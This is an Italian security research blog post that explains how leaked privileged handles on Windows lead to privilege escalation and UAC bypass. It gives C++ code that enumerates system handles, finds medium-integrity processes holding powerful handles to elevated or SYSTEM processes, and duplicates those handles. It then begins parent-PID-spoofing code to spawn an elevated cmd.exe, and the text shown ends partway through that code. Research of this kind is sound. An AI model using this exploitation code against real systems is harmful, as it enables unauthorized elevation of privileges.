---
layout: post
title: 🇮🇹 Gaining the upper hand(le)	
subtitle: Come trovare privilege escalation e bypass di UAC tramite leak di handle privilegiati
image: /img/tortellindows.png
published: true
author:
- last
---
[![tortellino windows](/img/tortellindows.png)](/img/tortellindows.png)

### TL;DR
Su Windows, una condizione che può verificarsi è quella in cui processi ad alta integrità (anche noti come processi elevati) o processi SYSTEM possono avere handle a oggetti del kernel come altri processi/thread/token e si trovano successivamente in condizione di generare processi figli a media integrità. Se questi oggetti citati sono privilegiati (ad esempio sono a loro volta processi elevati/SYSTEM) e vengono ereditati dal processo figlio, si verifica una situazione in cui un processo a media integrità detiene un handle a una risorsa privilegiata e, se tale handle viene clonato e adeguatamente sfruttato, ciò può portare a privilege escalation. In questo post vedremo come ricercare in maniera automatizzata tali situazioni e come sfruttarle per elevare i propri privilegi o aggirare misure di sicurezza come UAC.

### Introduzione
Salute compagni d'armi, qui è di nuovo [last](https://twitter.com/last0x00) a infastidirvi. Ultimamente, insieme ai compagni di sventura degli [Advanced Persistent Tortellini](https://aptw.tf/about), mi sono messo alla ricerca di un tipo particolare vulnerabilità che si può trovare su applicativi per Windows e che raramente viene discusso: i leak di handle privilegiati. Notando l'assenza di risorse che approfondiscano l'argomento, abbiamo deciso di scrivere (in [realtà tradurre](https://aptw.tf/2022/02/10/leaked-handle-hunting.html)) questo post.

Essenzialmente quello a cui miriamo è capire se e come possiamo cercare in maniera automatizzata processi non privilegiati (ossia a integrità media) che detengono handle verso risorse pregiate come processi ad alta integrità (anche noti come processi elevati), processi SYSTEM o thread appartenenti ai processi menzionati. A seguito di ciò dobbiamo assicurarci di poter aprire i processi non privilegiati in questione, clonare gli handle di interesse e infine sfruttarli per elevare i nostri privilegi. Vediamo rapidamente i requisiti per il tool che andremo a scrivere:
1. Deve eseguire a media integrità
2. Il `SeDebugPrivilege` non deve essere presente nel token del processo (normalmente non è presente nei token a media integrità in ogni caso)
3. Non può sfruttare bypass di UAC in quanto deve funzionare anche per utenti non amministratori

Il processo è abbastanza complesso, gli step che seguiremo saranno i seguenti:
1. Enumerare tutti gli handle aperti in tutti i processi (tramite [`NtQuerySystemInformation`](https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation))
2. Filtrare gli handle non interessanti - per il momento ci focalizzeremo solo sugli handle verso i processi, i token e i thread, in quanto sono quelli più facili da sfruttare
3. Filtrare gli handle che puntano a processi/thread/token a integrità inferiore a quella alta
4. Filtrare gli handle detenuti da processi con integrità superiore a media in quanto non possiamo agganciarci a questi senza il `SeDebugPrivilege`
5. Filtrare gli handle che non garantiscono un livello di accesso alla risorsa sufficiente
6. Verificare che siano rimasti handle (che quindi possono essere sfruttati per fare privilege escalation) ed eventualmente sfruttarli per elevare i nostri privilegi

[![ven diagram](/img/handlesven.jpg)](/img/handlesven.jpg)

Chiariamoci, è improbabile trovare questo genere di vulnerabilità su un sistema operativo appena installato (anche se, mai dire mai). Ciononostante, considerata la quantità di programmi di dubbia provenienza che i sysadmin installano e il livello di insicurezza che [i programmi](https://aptw.tf/2021/09/24/armoury-crate-privesc-ita.html) installati [dai manufacturer](https://aptw.tf/2022/01/20/acer-care-center-privesc-ita.html) attualmente mostrano, non è remota la possibilità di trovarne su sistemi in produzione da un po'.

Ora che abbiamo una vaga idea di quello che abbiamo intenzione di fare, ripassiamo i fondamentali.

#### Handles 101
Come ho discusso brevemente in questo [thread su Twitter](https://twitter.com/last0x00/status/1355910168706428940), Windows è un sistema operativo basato sugli oggetti (da non confondere con i linguaggi di programmazione a oggetti, che sono un'altra cosa). Con "basato sugli oggetti" intendiamo che ogni entità del sistema operativo (come processi, thread, mutex, semafori, file etc.) hanno un "oggetto" che li rappresenta nel kernel. Per i processi, per esempio, tale oggetto prende forma di una struttura dati chiamata [_EPROCESS](https://www.vergiliusproject.com/kernels/x64/Windows%2011/21H2%20(RTM)/_EPROCESS). Ogni processo ne ha una. Tutte le strutture `_EPROCESS` si trovano in kernelspace, ossia in quella porzione di memoria virtuale comune a tutti i processi e coincidente, nell'architettura x64, con i 128TB "alti" della memoria virtuale di un processo. Essendo una porzione di memoria condivisa, tutto ciò che è in kernelspace è uguale per tutti i processi, contrariamente a ciò che si trova in userspace, i 128TB "bassi" dello spazio di indirizzamento, che invece è diverso per ogni processo.

Essendo gli oggetti del kernel strutture di dati presenti in kernelspace non vi è modo per i normali processi di interagire direttamente con essi, in quanto ciò violerebbe tutti i principi di sicurezza su cui si poggia ~~già in maniera molto precaria~~ Windows. Per poter interagire con gli oggetti menzionati, Windows mette a disposizione dei processi un meccanismo di indirezione che si appoggia a variabili particolari di tipo `HANDLE` (e tipi derivati come `SC_HANDLE`). Un handle altro non è che una variabile che contiene un numero a 64 bit, sempre per quanto riguarda l'architettura x64. Tale numero rappresenta un indice in una tabella particolare ospitata in kernelspace, diversa per ogni processo. Ogni riga di questa tabella (nota come handle table) contiene l'indirizzo dell'oggetto cui l'handle fa riferimento e il livello di accesso all'oggetto che l'handle concede al processo che lo detiene. L'indirizzo a questa tabella è contenuto nel membro `ObjectTable` (che è di tipo `_HANDLE_TABLE *` e quindi punta a una variabile [`_HANDLE_TABLE`](https://www.vergiliusproject.com/kernels/x64/Windows%2011/21H2%20(RTM)/_HANDLE_TABLE)) della struttura `_EPROCESS` di ogni processo.

Per rendere digeribile questo impasto indigesto di nozioni tecniche, vediamo un esempio. Per ottenere un handle a un processo si utilizza la funzione [`OpenProcess`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess), esposta dalle API di Windows nella libreria `kernel32.dll`. Di seguito la definizione della funzione citata:

```c++
HANDLE OpenProcess(
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwProcessId
);
```

`OpenProcess` riceve in ingresso 3 parametri:
- `dwDesiredAccess` è una `DWORD` (double word - intero a 32 bit) che specifica il livello di accesso all'oggetto processo che l'handle deve garantire
- `bInheritHandle` è un valore booleano (vero/falso) che serve a specificare se l'handle ritornato dalla funzione deve essere ereditabile, significando che, nel caso il processo chiamante successivamente crei processi figli, l'handle ritornato da `OpenProcess` verrebbe copiato, assieme al livello di accesso, nella tabella degli handle del processo figlio
- `dwProcessId` è una `DWORD` usata per specificare quale processo vogliamo che `OpenProcess` apra (passando in input il Process ID - PID del processo) e quindi a quale processo farà riferimento l'handle ritornato dalla funzione

Se il processo chiamante ha privilegi sufficienti per aprire il processo target, `OpenProcess` ritornerà un handle al processo target stesso, con il livello di accesso specificato.

Nella riga di codice a seguire proverò ad aprire un handle al processo System (che ha sempre PID 4), specificando al kernel che il livello di accesso richiesto per l'handle equivale a `PROCESS_QUERY_LIMITED_INFORMATION`, valido per richiedere solo un subset ristretto di informazioni relative al processo in questione. Inoltre, passando `true` come secondo argomento, specifico che l'handle ritornato dalla funzione deve essere ereditato da eventuali processi figli. In caso tutto vada per il meglio, la variabile `hProcess` (di tipo `HANDLE`) conterrà l'handle richiesto.

```c++
HANDLE hProcess;
hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, 4);
```

Dietro le quinte, il kernel effettua una serie di controlli di sicurezza sul contesto di sicurezza (anche noto come token) del processo chiamante. Se tali controlli danno esito positivo, il kernel prende il PID passato in input, risolve l'indirizzo della `_EPROCESS` associata e lo copia nella handle table del processo chiamante assieme alla access mask (i livello di accesso) richiesta. L'indice della riga della handle table appena riempita viene successivamente ritornato al codice in usermode e dato al processo come valore di ritorno di `OpenProcess`. Cose simili avvengono per le funzioni `OpenThread` e `OpenToken`. 

#### Visualizzare e ottenere informazioni sugli handle
Come abbiamo introdotto precedentemente, i valori contenuti dagli handle sono essenzialmente indici di una tabella. Ogni riga della tabella contiene, fra le altre cose, l'indirizzo dell'oggetto cui l'handle fa riferimento e il livello di accesso all'oggetto che l'handle concede. Possiamo visualizzare graficamente queste informazioni attraverso strumenti come Process Hacker o Process Explorer:

[![handles 1](/img/handles1.png)](/img/handles1.png)

Da questo screenshot di Process Explorer possiamo ricavare una serie di informazioni:
- Riquadro rosso: il tipo di oggetto a cui l'handle si riferisce
- Casella blu: il valore dell'handle (l'indice effettivo della riga nella tabella)
- Casella gialla: l'indirizzo dell'oggetto a cui si riferisce l'handle
- Riquadro verde: la maschera di accesso e il suo valore decodificato (le maschere di accesso sono macro definite nell'header `Windows.h`). Questo ci dice quali privilegi sono concessi al detentore dell'handle sull'oggetto; 

Per ottenere questo genere di informazioni ci sono una serie di metodi. Tra questi, il più pratico e utile è utilizzare la funzione [`NtQuerySystemInformation`](https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation), parte delle API native esposte tramite `ntdll.dll`.

```c++
NTSTATUS NtQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
);
```

Chiamando la funzione in questione e passando come primo argomento `SystemHandleInformation` (che ha valore 0x10), il secondo argomento sarà riempito con una struttura non documentata di tipo `_SYSTEM_HANDLE_INFORMATION` contenente un array di variabili `SYSTEM_HANDLE` dove ognuna di queste contiene informazioni su un handle aperto e la dimensione dell'array stesso (`HandleCount`):

```c++
typedef struct _SYSTEM_HANDLE_INFORMATION 
{
    ULONG HandleCount;
    SYSTEM_HANDLE* Handles;
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;
```

Tutti gli handle presenti nel sistema operativi al momento della chiamata alla funzione sono inseriti nell'array in questione. La struttura di `SYSTEM_HANDLE` non è documentata, qui di seguito la definizione.

```c++
typedef struct _SYSTEM_HANDLE 
{
    ULONG ProcessId;
    BYTE ObjectTypeNumber;
    BYTE Flags;
    USHORT Handle;
    PVOID Object;
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;
```
La struttura in questione presenta una serie di membri che forniscono informazioni interessanti riguardo l'handle cui la struttura stessa si riferisce. Andiamo ad approfondirli uno a uno:
- `ProcessId`: il PID del processo che detiene cui la struttura fa riferimento
- `Handle`: il valore dell'handle, cioè l'indice nella riga della handle table
- `Object`: l'indirizzo in kernelspace dell'oggetto cui l'handle fa riferimento
- `ObjectTypeNumber`: una variabile non documentata di tipo `BYTE` che identifica il tipo di oggetto cui l'handle fa riferimento. Per interpretare questo valore dobbiamo fare un po' di reverse engineering, ma per ora ci basta sapere che gli handle riferiti a processi hanno questo valore settato a `0x7`, quelli riferiti ai thread a `0x8` e quelli riferiti ai token a `0x5`
- `GrantedAccess`: il livello di accesso all'oggetto che l'handle garantisce. Si possono richiedere livelli di accesso diversi per ogni oggetto. Per esempio valori ammissibili per i processi sono `PROCESS_ALL_ACCESS`, `PROCESS_CREATE_PROCESS` etc.

Vediamo ora brevemente come chiamare `NtQuerySystemInformation` utilizzando il C++.

```c++
NTSTATUS queryInfoStatus = 0;
PSYSTEM_HANDLE_INFORMATION tempHandleInfo = nullptr;
size_t handleInfoSize = 0x10000;
auto handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
if (handleInfo == NULL) return mSysHandlePid;
while (queryInfoStatus = NtQuerySystemInformation(
	SystemHandleInformation, //0x10
	handleInfo,
	static_cast<ULONG>(handleInfoSize),
	NULL
) == STATUS_INFO_LENGTH_MISMATCH)
{
	tempHandleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);
	if (tempHandleInfo == NULL) return mSysHandlePid;
	else handleInfo = tempHandleInfo;
}
```

Nel blocco di codice riportato facciamo uso delle seguenti variabili:
1. `queryInfoStatus` che conterrà il valore di ritorno di `NtQuerySystemInformation` e che utilizzeremo per capire se la funzione è stata eseguita con successo o meno
2. `tempHandleInfo` che conterrà i dati relativi a tutti gli handle sul sistema che `NtQuerySystemInformation` recupera per noi
3. `handleInfoSize` che è una "ipotesi" di quanta memoria sarà utilizzata per memorizzare i dati ritornati dalla funzione - questa variabile verrà raddoppiata ogni volta che `NtQuerySystemInformation` restituirà `STATUS_INFO_LENGTH_MISMATCH` che è un valore che ci dice che lo spazio allocato non è sufficiente
4. `handleInfo` che è un puntatore alla porzione di memoria che `NtQuerySystemInformation` riempirà con i dati di cui abbiamo bisogno (cioè la struttura `_SYSTEM_HANDLE_INFORMATION`)

Non fatevi confondere dal ciclo `while` utilizzato, è solo un modo di chiamare la funzione finché la memoria allocata non è sufficiente. Questo metodo è impiegato abbastanza spesso quando si ha a che fare con funzioni appartenenti alle API native di Windows.

I dati recuperati dalla funzione `NtQuerySystemInformation` possono essere poi parsati semplicemente iterando sull'array ritornato, come nell'esempio a seguire:

```c++
for (uint32_t i = 0; i < handleInfo->HandleCount; i++) 
{
	auto handle = handleInfo->Handles[i];
	std::cout << "[*] PID: " << handle.ProcessId << "\n\t"
		  << "|_ Handle value: 0x" << std::hex << static_cast<uint64_t>(handle.Handle) << "\n\t"
                  << "|_ Object address: 0x" << std::hex << reinterpret_cast<uint64_t>(handle.Object) << "\n\t"
                  << "|_ Object type: 0x" << std::hex << static_cast<uint32_t>(handle.ObjectTypeNumber) << "\n\t"
                  << "|_ Access granted: 0x" << std::hex << static_cast<uint32_t>(handle.GrantedAccess) << std::endl;  
}
```
Come si può evincere dal precedente blocco di codice, abbiamo la variabile `handle` il cui tipo è `SYSTEM_HANDLE` (nascosto dall'uso della keyword `auto`). Usiamo successivamente i membri della struttura `SYSTEM_HANDLE` salvata in `handle` per stampare a schermo le informazioni di interesse.

[![listing handles with c++](/img/handles2.png)](/img/handles2.png)

In questo screenshot possiamo osservare 3 handle detenuti dal processo con PID 4 (che ricordiamo essere il processo System). Tutti questi handle sono riferiti a oggetti di tipo processo, come si può evincere dal object type `0x7`. Possiamo inoltre dedurre che i primi due handle sono riferiti allo stesso processo, in quanto l'object address è uguale, ma solo il primo dei 2 garantisce al processo System un accesso al processo rilevante, in quanto l'access granted ha valore `0x1fffff`, che è il valore tradotto di `PROCESS_ALL_ACCESS`.

Sfortunatamente nella mia ricerca non ho trovato un modo diretto ed efficiente di estrarre i PID dei processi a cui gli handle fanno riferimento (a partire dal membro `ObjectAddress`). Vedremo dopo come aggirare questo problema, per ora limitiamoci a confrontare le informazioni che abbiamo stampato a schermo con quelle estratte tramite Process Explorer.

[![seeing the process with procexp](/img/handles3.png)](/img/handles3.png)

Come potete vedere, l'handle con valore `0x828` è, come ci aspettavamo, di tipo processo e si riferisce al processo `services.exe`. Sia l'indirizzo in kernelspace dell'oggetto che l'accesso garantito dall'handle corrispondono e, guardando sulla destra la maschera d'accesso decodificata, potete vedere che il valore decodificato è `PROCESS_ALL_ACCESS`.

Ciò è molto interessante perché sostanzialmente ci permette di avere visibilità sulla handle table di qualsiasi processo, a prescindere dal suo contesto di sicurezza o dal livello di protezione (PP o PPL) che tale processo ha.

### A caccia di vulnerabilità 
#### Ottenere il PID di un processo a partire dall'indirizzo della sua _EPROCESS
Nella mia ricerca non ho trovato un modo diretto ed efficiente di associare il un `SYSTEM_HANDLE` di tipo processo/thread al processo/thread a cui questo handle si riferisce. Il campo `ProcessId` della struttura infatti si riferisce al processo che detiene l'handle in questione, non al processo/thread cui questo punta, del quale l'unica informazione che abbiamo è l'indirizzo della `_EPROCESS` o `_ETHREAD` in kernelspace tramite il membro `Object`. Per tal ragione ho adottato un approccio poco ortodosso (per non dire direttamente "brutto") che però mi permette di recuperare in maniera veloce ed efficiente l'associazione indirizzo in kernelspace - PID/TID del processo/thread puntato. A tal riguardo, vediamo i presupposti (alcuni dei quali già introdotti precedentemente) per arrivare a tale soluzione:
- La struttura `SYSTEM_HANDLE` contiene il membro `Object`, che contiene l'indirizzo dell'oggetto del kernel, che è in kernelspace
- In Windows, tutti i processi hanno il proprio spazio  di indirizzamento privato, ma la porzione di tale spazio denominata kernelspace (128 TB superiori per i processi a 64 bit) è la stessa per tutti i processi. Gli indirizzi in kernelspace contengono gli stessi dati in tutti i processi
- Quando abbiamo a che fare con handle riferiti a processi, il membro `Object` di `SYSTEM_HANDLE` punta alla struttura `_EPROCESS` del processo stesso. Per i thread la struttura invece è la `_ETHREAD`, per la quale valgono gli stessi discorsi di `_EPROCESS`
- Ogni processo ha una sola struttura `_EPROCESS`
- Possiamo ottenere un handle per qualsiasi processo, indipendentemente dal suo contesto di sicurezza, chiamando `OpenProcess` e specificando `PROCESS_QUERY_LIMITED_INFORMATION` come access mask
- Chiamando `NtQuerySystemInformation` possiamo enumerare tutti gli handle aperti da tutti i processi in esecuzione al momento della chiamata

Da questo considerazioni possiamo dedurre quanto segue:
- Il membro `Object` di due diverse strutture `SYSTEM_HANDLE` sarà uguale se l'handle è aperto sullo stesso oggetto, indipendentemente dal processo che detiene l'handle (es. due handle aperti sullo stesso file da due diversi processi avranno lo stesso valore `Object`)
	- Due handle allo stesso processo aperti da due processi diversi avranno un valore `Object` corrispondente
	- Lo stesso vale per thread, token, ecc.
- Quando chiamiamo `NtQuerySystemInformation` possiamo enumerare gli handle detenuti anche dal nostro stesso processo
- Se otteniamo un handle a un processo tramite `OpenProcess`, conosciamo il PID di detto processo e, tramite `NtQuerySystemInformation`, l'indirizzo in kernelspace della `_EPROCESS` associata

Avete intuito in che direzione stiamo andando? Se riusciamo ad aprire un handle con accesso `PROCESS_QUERY_LIMITED_INFORMATION` a ogni processo e successivamente recuperare tutti gli handle aperti tramite `NtQuerySystemInformation` possiamo filtrare gli handle non detenuti dal nostro processo ed estrarre dai rimanenti il contenuto del membro `Object`, riuscendo così ad associare il PID di ogni processo all'indirizzo della relativa struttura `_EPROCESS`. Ovviamente lo stesso può essere effettuato per i thread usando [`OpenThread`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread) e `THREAD_QUERY_INFORMATION_LIMITED` come livello di accesso per gli handle richiesti.

Per aprire in maniera efficiente i processi e i thread in esecuzione ci appoggiamo alle funzioni esposte dalla libreria `TlHelp32.h`, che in buona sostanza ci permette di effettuare un'istantanea dello stato del sistema operativo al momento dell'esecuzione e ricavare quanti e quali processi sono in esecuzione, con tanto di PID.

Il seguente blocco di codice mostra come effettuare l'istantanea di cui abbiamo parlato e successivamente iterarci sopra per aprire un handle a ogni processo.

```c++

// mappa che conterrà l'associazione handle - PID
std::map<HANDLE, DWORD> mHandleId;

// crea l'istantanea utilizzando CreateToolhelp32Snapshot
wil::unique_handle snapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
PROCESSENTRY32W processEntry = { 0 };
processEntry.dwSize = sizeof(PROCESSENTRY32W);

// punta la struttura processEntry al primo processo dell'istantanea
auto status = Process32FirstW(snapshot.get(), &processEntry); 

// inizia a iterare, aggiornando di volta in volta processEntry mentre si cerca di aprire ogni singolo processo, associandone il PID al valore dell'handle aperto
std::cout << "[*] Iterating through all the PID/TID space to match local handles with PIDs/TIDs...\n";
do
{
	auto hTempHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processEntry.th32ProcessID);
	if (hTempHandle != NULL)
	{
		// if we manage to open a shHandle to the process, insert it into the HANDLE - PID map at its PIDth index
		mHandleId.insert({ hTempHandle, processEntry.th32ProcessID });
	}
} while (Process32NextW(snapshot.get(), &processEntry));
```

Iniziamo col definire una `std::map`, ossia una classe simile a un dizionario per il C++, la quale ci permetterà di tenere traccia dell'associazione fra PID del processo aperto e il valore dell'handle riferito al processo aperto. Chiameremo questa mappa `mHandleId`.

Fatto ciò, procediamo a effettuare l'istantanea dello stato del sistema utilizzando [`CreateToolhelp32Snapshot`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) e specificando che vogliamo che l'istantanea contenga informazioni relative ai processi in esecuzione (utilizzando il valore `TH32CS_SNAPPROCESS` come argomento). L'istantanea creata è assegnata alla variabile `snapshot` di tipo `wil::unique_handle`, una classe C++ della Windows Implementation Library (WIL) che ci permette di gestire in maniera sicura (attraverso il paradigma RAII e altre facilities del C++) i tipi `HANDLE`-like. Successivamente procediamo a definire e inizializzare a zero la variabile di tipo `PROCESSENTRY32W` chiamata `processEntry`, che conterrà le informazioni di ogni processo mentre iteriamo sull'istantanea.

In seguito procediamo a chiamare [`Process32FirstW`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first) e riempiere `processEntry` con i dati del primo processo dell'istantanea. Come già accennato, per ogni processo chiameremo `OpenProcess` con `PROCESS_QUERY_LIMITED_INFORMATION` e, se la chiamata termina con successo, salviamo la coppia formata dal valore dell'handle e dal PID del processo aperto nella mappa `mHandleId`.

Al termine di ogni iterazione del ciclo `while` eseguiamo la funzione [`Process32NextW`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32nextw) e riempiamo `processEntry` con i dati del processo successivo contenuto nell'istantanea, fin quando non abbiamo esaminato tutti i processi dell'istantanea. Al termine del ciclo abbiamo una mappatura 1 a 1 di tutti gli handle aperti dal nostro processo con i rispettivi PID dei processi cui gli handle citati fanno riferimento. Procediamo alla fase successiva!

è arrivato il momento di creare la mappa che associerà handle ai processi aperti dal nostro processo e gli indirizzi in kernelspace delle strutture `_EPROCESS` dei suddetti processi. Per fare ciò dobbiamo recuperare tutti gli handle del sistema operativo e filtrare quelli che non appartengono al nostro processo. Abbiamo già visto come recuperare tutti gli handle aperti utilizzando `NtQuerySystemInformation`, a questo punto si tratta solo di analizzare il membro `ProcessId` della struttura `SYSTEM_HANDLE` e compararlo con il PID del nostro processo, recuperato tramite la funzione [`GetCurrentProcessId`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocessid).

Come si può evincere dal blocco di codice a seguire, filtriamo gli handle che non appartengono al nostro processo, dopodiché prendiamo in considerazione solo quelli che fanno riferimento a un processo e ne insieriamo l'associazione fra handle e indirizzo in kernelspace nella mappa `mAddressHandle`.

```c++
std::map<uint64_t, HANDLE> mAddressHandle;
for (uint32_t i = 0; i < handleInfo->HandleCount; i++) 
{
    auto handle = handleInfo->Handles[i];

    // skip handles not belonging to this process
    if (handle.ProcessId != pid)
        continue;
    else
    {
        // switch on the type of object the handle refers to
        switch (handle.ObjectTypeNumber)
        {
        case OB_TYPE_INDEX_PROCESS:
        {
            mAddressHandle.insert({ (uint64_t)handle.Object, (HANDLE)handle.Handle }); // fill the ADDRESS - HANDLE map 
            break;
        }

        default:
            continue;
        }
    }
}
```

Potrebbe esservi saltato all'occhio il fatto che usiamo uno `switch` al posto di un comune `if`. Il motivo è che questo pezzo di codice è estratto e modificato da un tool che come [Advanced Persistent Tortellini](https://twitter.com/aptortellini) stiamo sviluppando chiamato UpperHandler. UpperHandler è sviluppato specificamente per trovare vulnerabilità di questo tipo, non solo su processi ma anche su thread e altro (ecco perché lo `switch`). UpperHandler sarà rilasciato quando lo riterremo opportuno.

Adesso che abbiamo riempito le due mappe `mHandleId` e `mAddressHandle`, recuperare il PID di un processo a partire dall'indirizzo della sua `_EPROCESS` è in realtà un gioco da ragazzi.

```c++
auto address = (uint64_t)(handle.Object);
auto foundHandlePair = mAddressHandle.find(address);
auto foundHandle = foundHandlePair->second;
auto handlePidPair = mHandleId.find(foundHandle);
auto handlePid = handlePidPair->second;
```

Iniziamo con il salvare l'indirizzo della `_EPROCESS` nella variabile `address`, dopodiché cerchiamo la coppia che contiene tale indirizzo nella mappa `mAddressHandle`, estraendo poi dalla coppia l'handle associato. A questo punto, con l'handle, recuperiamo dalla mappa `mHandleId` la coppia che contiene il PID del processo cui l'handle fa riferimento e recuperiamo il PID.

#### Trovare automagicamente l'ago nel pagliaio
Adesso che abbiamo un metodo veloce e affidabile di recuperare i PID a partire dagli indirizzi in kernelspace della `_EPROCESS`, possiamo concentrarci sul cercare situazioni in cui processi a bassa integrità hanno handle privilegiati a processi ad alta integrità. Ma cosa si intende con la locuzione "handle privilegiato"? [Bryan Alexander](https://twitter.com/dronesec) lo esprime in maniera abbastanza chiara in [questo blogpost](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/), ma essenzialmente, quando si parla di handle facenti riferimento a processi, i livelli di accesso (quindi le flag, essendo l'access mask degli handle una bitmask) che rendono un handle privilegiato sono i seguenti:
- `PROCESS_ALL_ACCESS`
- `PROCESS_CREATE_PROCESS`
- `PROCESS_CREATE_THREAD`
- `PROCESS_DUP_HANDLE`
- `PROCESS_VM_WRITE`

Se trovare un handle verso un processo ad alta integrità con uno o più di questi livelli di accesso in un processo a integrità media, avete fatto jackpot. Vediamo come incassare la vincita:

```c++
std::vector<SYSTEM_HANDLE> vSysHandle;
for (uint32_t i = 0; i < handleInfo->HandleCount; i++) {
    auto sysHandle = handleInfo->Handles[i];
    auto currentPid = sysHandle.ProcessId;
    if (currentPid == pid) continue; // skip our process' handles
    auto integrityLevel = GetTargetIntegrityLevel(currentPid);

    if (
        integrityLevel != 0 &&
        integrityLevel < SECURITY_MANDATORY_HIGH_RID && // the integrity level of the process must be < High
        sysHandle.ObjectTypeNumber == OB_TYPE_INDEX_PROCESS
	)        
    {
        if (!(sysHandle.GrantedAccess == PROCESS_ALL_ACCESS || 
        	sysHandle.GrantedAccess & PROCESS_CREATE_PROCESS || 
        	sysHandle.GrantedAccess & PROCESS_CREATE_THREAD || 
        	sysHandle.GrantedAccess & PROCESS_DUP_HANDLE || 
        	sysHandle.GrantedAccess & PROCESS_VM_WRITE)) continue;
        
        auto address = (uint64_t)(sysHandle.Object);
        auto foundHandlePair = mAddressHandle.find(address);
        if (foundHandlePair == mAddressHandle.end()) continue;
        auto foundHandle = foundHandlePair->second;
        auto handlePidPair = mHandleId.find(foundHandle);
        auto handlePid = handlePidPair->second;
        auto handleIntegrityLevel = GetTargetIntegrityLevel(handlePid);
        if (
            handleIntegrityLevel != 0 &&
            handleIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID // the integrity level of the target must be >= High
            )
        {
            vSysHandle.push_back(sysHandle); // save the interesting SYSTEM_HANDLE
        }
    }  
}
```
  
In questo blocco di codice iniziamo con il definire un `std::vector` chiamato `vSysHandle` che conterrà tutti i `SYSTEM_HANDLE` interessanti. Successivamente chiamiamo `NtQuerySystemInformation` e iteriamo sui dati ritornati dalla funzione, solo che questa volta saltiamo gli handle detenuti dal nostro processo per focalizzarci su quelli degli altri processi. Per ognuno di questi processi controlliamo il livello di integrità con la funzione `GetTargetIntegrityLevel`, una funzione di supporto che ho scritto e riadattato da una serie di PoC online e di funzioni disponibili su MSDN. Tale funzione ritorna una `DWORD` contenente il livello di integrità del token associato al PID su cui è chiamata.

Una volta recuperato il livello di integrità del processo che detiene l'handle, ci assicuriamo sia minore di `SECURITY_MANDATORY_HIGH_RID`, poiché siamo interessati solo ai processi a media e bassa integrità, e ci assicuriamo inoltre che il `SYSTEM_HANDLE` si riferisca a risorse di tipo processo (`0x7`). Smarcato anche questo, procediamo a controllare il livello di accesso. Se questo non è `PROCESS_ALL_ACCESS` o non contiene nemmeno una delle flag di cui abbiamo parlato prima, lo saltiamo. Viceversa, proseguiamo e controlliamo il livello di integrità del processo puntato dal `SYSTEM_HANDLE`. Se è ad alta integrità o (meglio ancora) SYSTEM, lo salviamo dentro il vettore `vSysHandle`.

Questo è quanto, auspicabilmente abbiamo il nostro vettore pieno (o semi vuoto) di handle vulnerabili, vediamo come exploitarli.

### Gaining the upper hand(le) - questa va bene così e non la traduco :P
Abbiamo separato gli aghi dalla paglia, e mò? Nuovamente, il [blogpost di dronesec](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/) dettaglia cosa può essere fatto con ogni diverso livello di accesso, ma per ora concentriamoci su quello più semplice: `PROCESS_ALL_ACCESS`.

Prima di tutto iniziamo con l'agganciarci al processo che detiene l'handle vulnerabile e procediamo a clonare l'handle in questione.

```c++
DWORD ownerPid = SysHandle.ProcessId;
HANDLE elevatedToken = NULL;
auto hOwner = OpenProcess(PROCESS_DUP_HANDLE, false, ownerPid);
HANDLE clonedHandle;
auto success = DuplicateHandle(hOwner, (HANDLE)sysHandle.Handle, GetCurrentProcess(), &clonedHandle, NULL, false, DUPLICATE_SAME_ACCESS);
```

Quest'operazione è abbastanza semplice e, se omettiamo di inserire la logica di controllo degli errori, fattibile in poche righe di codice. Iniziamo con l'aprire il processo che detiene l'handle vulnerabile con il livello di accesso `PROCESS_DUP_HANDLE`, che è il livello di accesso minimo per poter clonare gli handle detenuti dal processo, e successivamente usiamo la funzione [`DuplicateHandle`](https://docs.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-duplicatehandle) per clonare l'handle cui siamo interessati (il cui valore è contenuto nel membro `Handle` della struttura `sysHandle`) e salvarne il valore nella variabile `clonedHandle`.

A questo punto `clonedHandle` conterrà un handle `PROCESS_ALL_ACCESS` a un processo ad alta integrità. Da qui in avanti si segue la procedura standard per creare un nuovo processo (in questo caso `cmd.exe`) che erediti il token dal processo di cui abbiamo l'handle `PROCESS_ALL_ACCESS`. La tecnica utilizzata è un classico esempio di Parent PID spoofing utilizzando la funzione `CreateProcessW`, così come spiegato in [questo post del buon spotless](https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing)

```c++
STARTUPINFOEXW sinfo = { sizeof(sinfo) };
PROCESS_INFORMATION pinfo;
LPPROC_THREAD_ATTRIBUTE_LIST ptList = NULL;
SIZE_T bytes = 0;
sinfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);
InitializeProcThreadAttributeList(NULL, 1, 0, &bytes);
ptList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(bytes);
InitializeProcThreadAttributeList(ptList, 1, 0, &bytes);
